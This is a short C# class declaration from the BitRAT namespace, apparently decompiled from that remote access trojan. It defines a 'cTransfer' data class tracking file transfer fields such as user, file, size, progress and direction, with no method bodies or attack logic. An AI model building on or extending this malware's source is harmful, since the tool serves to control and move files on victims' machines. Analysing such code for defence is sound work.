﻿namespace BitRAT
{
    using System;

    public class cTransfer
    {
        public string[] idxValues;
        public string Key;
        public string sKey;
        public bool TRANSFER_ACTIVE;
        private string m_group_id;
        private string m_user_key;
        private string m_user;
        private string m_file;
        private string m_size;
        private long m_size_bytes;
        private string m_progress;
        private string m_status;
        private string m_speed;
        private string m_elapsed;
        private string m_eta;
        private string m_direction;
        private string m_tag;
        public bool bJustConnected;
        public bool pending_dc;
        public bool pending_dc_timeout;

        public cTransfer();

        public string GROUP_ID { get; set; }

        public string USER_KEY { get; set; }

        public string USER { get; set; }

        public string FILE { get; set; }

        public string SIZE { get; set; }

        public long SIZE_BYTES { get; set; }

        public string PROGRESS { get; set; }

        public string SPEED { get; set; }

        public string STATUS { get; set; }

        public string ELAPSED { get; set; }

        public string ETA { get; set; }

        public string DIRECTION { get; set; }

        public string Tag { get; set; }
    }
}

